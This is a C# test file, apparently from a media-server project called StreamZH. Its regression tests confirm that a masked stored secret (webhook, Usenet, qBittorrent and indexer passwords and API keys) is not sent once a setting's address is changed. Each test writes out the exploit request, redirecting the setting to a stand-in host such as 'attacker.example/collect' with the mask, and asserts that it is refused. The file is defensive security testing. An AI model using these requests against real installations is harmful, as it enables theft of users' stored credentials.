// StreamZH - one app for your whole media pipeline.
// Copyright (c) 2026 The StreamZH Authors.
// SPDX-License-Identifier: GPL-3.0-only

using System.Net;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc.Testing;
using Microsoft.AspNetCore.TestHost;
using Microsoft.Extensions.DependencyInjection;
using StreamZH.Core.Indexers;
using StreamZH.Library.ImportLists;
using StreamZH.Library.Indexers;
using StreamZH.Library.Notifications;
using StreamZH.Tests.Connect;
using StreamZH.Tests.Library;
using StreamZH.Tests.Library.ImportLists;
using StreamZH.Tests.Torrents;
using StreamZH.Tests.Usenet;

namespace StreamZH.Tests.Host;

/// <summary>
/// 0.12 (S3-03): "********" sent back for a stored secret only means "the stored one" while the destination is the
/// stored one. Each test reproduces the exploit: keep the mask, point the test (or the saved item) at another address and
/// receive the stored secret there.
/// </summary>
public sealed class SecretReuseApiTests : IAsyncLifetime
{
    private const string Mask = "********";
    private readonly StreamZhFactory _factory = new(new FakeTmdbClient());
    private readonly FakeHttp _connectHttp = new();
    private readonly StubIndexerClient _indexerClient = new();
    private readonly ListHttp _listHttp = new(_ => (HttpStatusCode.OK, "[]"));
    private readonly string _media = Directory.CreateTempSubdirectory("streamzh-reuse-").FullName;
    private WebApplicationFactory<Program> _app = null!;
    private HttpClient _owner = null!;

    public async Task InitializeAsync()
    {
        _app = _factory.WithWebHostBuilder(builder => builder.ConfigureTestServices(services =>
        {
            services.AddHttpClient(ConnectHttp.ClientName).ConfigurePrimaryHttpMessageHandler(() => _connectHttp);
            services.AddSingleton(new ConnectOptions([TimeSpan.FromMilliseconds(1)]));
            services.AddHttpClient(ImportListHttp.ClientName).ConfigurePrimaryHttpMessageHandler(() => _listHttp);
            services.AddSingleton<IIndexerClient>(_indexerClient);
        }));
        _owner = _app.CreateClient();
        (await _owner.PostAsJsonAsync("/api/v1/auth/setup", new { username = StreamZhFactory.OwnerName, password = StreamZhFactory.OwnerPassword })).EnsureSuccessStatusCode();
    }

    public async Task DisposeAsync()
    {
        await _app.DisposeAsync();
        await _factory.DisposeAsync();
        Directory.Delete(_media, recursive: true);
    }

    private static async Task<string> ErrorAsync(HttpResponseMessage response, string field)
    {
        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        var body = await response.Content.ReadFromJsonAsync<JsonElement>();
        return body.GetProperty("errors").GetProperty(field)[0].GetString()!;
    }

    private static async Task<int> IdAsync(HttpResponseMessage response)
    {
        Assert.True(response.IsSuccessStatusCode, await response.Content.ReadAsStringAsync());
        return (await response.Content.ReadFromJsonAsync<JsonElement>()).GetProperty("id").GetInt32();
    }

    [Fact]
    public async Task Connect_webhook_password_is_not_sent_to_a_changed_url()
    {
        object Hook(int id, string url, string password) => new
        {
            id,
            name = "Hook",
            implementation = "webhook",
            onGrab = true,
            settings = new { url, username = "user", password },
        };
        var id = await IdAsync(await _owner.PostAsJsonAsync("/api/v1/connection", Hook(0, "https://hooks.example.com/streamzh", "hook-pass")));

        // The exploit: test with the stored id, an attacker URL and the mask.
        var test = await _owner.PostAsJsonAsync("/api/v1/connection/test", Hook(id, "https://attacker.example/collect", Mask));
        Assert.Equal("Enter the password again to test a changed address.", await ErrorAsync(test, "password"));
        var save = await _owner.PutAsJsonAsync($"/api/v1/connection/{id}", Hook(id, "https://attacker.example/collect", Mask));
        Assert.Equal("Enter the password again to save a changed address.", await ErrorAsync(save, "password"));
        Assert.DoesNotContain(_connectHttp.Requests, r => r.Uri.Host == "attacker.example");

        // The same address keeps working with the mask; a typed password may go anywhere.
        Assert.Equal(HttpStatusCode.OK, (await _owner.PostAsJsonAsync("/api/v1/connection/test", Hook(id, "https://hooks.example.com/streamzh", Mask))).StatusCode);
        Assert.Equal("Basic " + Convert.ToBase64String(Encoding.UTF8.GetBytes("user:hook-pass")), _connectHttp.Last.Header("Authorization"));
        Assert.Equal(HttpStatusCode.OK, (await _owner.PutAsJsonAsync($"/api/v1/connection/{id}", Hook(id, "https://hooks2.example.com/streamzh", "new-pass"))).StatusCode);
    }

    [Fact]
    public async Task Import_list_api_key_is_not_sent_to_a_changed_url()
    {
        var path = Directory.CreateDirectory(Path.Combine(_media, "movies")).FullName;
        var root = await IdAsync(await _owner.PostAsJsonAsync("/api/v1/rootfolders", new { path, mediaType = "Movie" }));
        object List(int id, string url, string apiKey) => new
        {
            id,
            name = "Other StreamZH",
            implementation = ImportListCatalog.StreamZh,
            mediaType = "Movie",
            enabled = true,
            enableAuto = false,
            rootFolderId = root,
            settings = new { url, apiKey },
        };
        var id = await IdAsync(await _owner.PostAsJsonAsync("/api/v1/importlist", List(0, "http://streamzh.example:9797", "other-key")));

        Assert.Equal("Enter the API key again to test a changed address.", await ErrorAsync(await _owner.PostAsJsonAsync("/api/v1/importlist/test", List(id, "http://attacker.example", Mask)), "apiKey"));
        Assert.Equal("Enter the API key again to test a changed address.", await ErrorAsync(await _owner.PostAsJsonAsync("/api/v1/importlist/preview", List(id, "http://attacker.example", Mask)), "apiKey"));
        Assert.Equal("Enter the API key again to save a changed address.", await ErrorAsync(await _owner.PutAsJsonAsync($"/api/v1/importlist/{id}", List(id, "http://attacker.example", Mask)), "apiKey"));
        Assert.DoesNotContain(_listHttp.Requests, r => r.Host == "attacker.example");
        Assert.Equal(HttpStatusCode.OK, (await _owner.PutAsJsonAsync($"/api/v1/importlist/{id}", List(id, "http://streamzh.example:9797", Mask))).StatusCode);
    }

    [Fact]
    public async Task Usenet_password_is_not_sent_to_a_changed_server()
    {
        await using var attacker = new FakeNntpServer();
        object Server(int id, string host, int port, string password) => new
        {
            id,
            name = "Provider",
            host,
            port,
            useSsl = false,
            username = "user",
            password,
            connections = 2,
            priority = 0,
            enabled = true,
        };
        var id = await IdAsync(await _owner.PostAsJsonAsync("/api/v1/usenet/server", Server(0, "news.example.com", 119, "provider-pass")));

        var test = await _owner.PostAsJsonAsync("/api/v1/usenet/server/test", Server(id, "127.0.0.1", attacker.Port, Mask));
        Assert.Equal("Enter the password again to test a changed address.", await ErrorAsync(test, "password"));
        var save = await _owner.PutAsJsonAsync($"/api/v1/usenet/server/{id}", Server(id, "127.0.0.1", attacker.Port, Mask));
        Assert.Equal("Enter the password again to save a changed address.", await ErrorAsync(save, "password"));
        Assert.Equal(0, attacker.ConnectionsOpened);

        // Another port of the same host is another destination, too; the same one saves.
        Assert.Equal(HttpStatusCode.BadRequest, (await _owner.PutAsJsonAsync($"/api/v1/usenet/server/{id}", Server(id, "news.example.com", 563, Mask))).StatusCode);
        Assert.Equal(HttpStatusCode.OK, (await _owner.PutAsJsonAsync($"/api/v1/usenet/server/{id}", Server(id, "NEWS.example.com", 119, Mask))).StatusCode);
    }

    [Fact]
    public async Task Download_client_password_is_not_sent_to_a_changed_address()
    {
        await using var real = new FakeQBittorrent { Username = "admin", Password = "qbit-pass" };
        await using var attacker = new FakeQBittorrent();
        await real.StartAsync();
        await attacker.StartAsync();
        object Client(int id, int port, string password) => new
        {
            id,
            name = "qBittorrent",
            implementation = "qBittorrent",
            enable = true,
            priority = 1,
            fields = new object[]
            {
                new { name = "host", value = "127.0.0.1" },
                new { name = "port", value = port },
                new { name = "username", value = "admin" },
                new { name = "password", value = password },
            },
        };
        var id = await IdAsync(await _owner.PostAsJsonAsync("/api/v1/downloadclient", Client(0, real.Port, "qbit-pass")));

        var test = await _owner.PostAsJsonAsync("/api/v1/downloadclient/test", Client(id, attacker.Port, Mask));
        Assert.Equal("Enter the password again to test a changed address.", await ErrorAsync(test, "password"));
        var save = await _owner.PutAsJsonAsync($"/api/v1/downloadclient/{id}", Client(id, attacker.Port, Mask));
        Assert.Equal("Enter the password again to save a changed address.", await ErrorAsync(save, "password"));
        Assert.Equal(0, attacker.Logins);

        Assert.Equal(HttpStatusCode.OK, (await _owner.PostAsJsonAsync("/api/v1/downloadclient/test", Client(id, real.Port, Mask))).StatusCode);
        Assert.True(real.Logins > 0);
    }

    [Fact]
    public async Task Indexer_api_key_is_not_sent_to_a_changed_address_also_not_by_a_clone()
    {
        object Indexer(int id, string baseUrl, string apiKey, string apiPath = "/api", int? cloneFromId = null) => new
        {
            id,
            name = id == 0 ? "Copy" : "Indexer",
            implementation = "Newznab",
            baseUrl,
            apiPath,
            apiKey,
            categories = new[] { 2000 },
            tvCategories = new[] { 5040 },
            priority = 25,
            cloneFromId,
        };
        var id = await IdAsync(await _owner.PostAsJsonAsync("/api/v1/indexer", Indexer(0, "https://indexer.example/", "stored-key")));

        Assert.Equal("Enter the API key again to test a changed address.", await ErrorAsync(await _owner.PostAsJsonAsync("/api/v1/indexer/test", Indexer(id, "https://attacker.example/", Mask)), "apiKey"));
        Assert.Equal("Enter the API key again to save a changed address.", await ErrorAsync(await _owner.PutAsJsonAsync($"/api/v1/indexer/{id}", Indexer(id, "https://attacker.example/", Mask)), "apiKey"));
        Assert.Equal(HttpStatusCode.BadRequest, (await _owner.PutAsJsonAsync($"/api/v1/indexer/{id}", Indexer(id, "https://indexer.example/", Mask, apiPath: "/other"))).StatusCode);

        // "Clone" takes the key of another indexer: only for that indexer's address.
        Assert.Equal("Enter the API key again to test a changed address.", await ErrorAsync(await _owner.PostAsJsonAsync("/api/v1/indexer/test", Indexer(0, "https://attacker.example/", Mask, cloneFromId: id)), "apiKey"));
        Assert.Equal("Enter the API key again to save a changed address.", await ErrorAsync(await _owner.PostAsJsonAsync("/api/v1/indexer", Indexer(0, "https://attacker.example/", Mask, cloneFromId: id)), "apiKey"));
        Assert.DoesNotContain("attacker.example", _indexerClient.LastIndexer?.BaseUrl ?? string.Empty, StringComparison.Ordinal);

        Assert.Equal(HttpStatusCode.OK, (await _owner.PostAsJsonAsync("/api/v1/indexer/test", Indexer(id, "https://indexer.example", Mask))).StatusCode);
        Assert.Equal("stored-key", _indexerClient.LastIndexer!.ApiKey);
    }
}
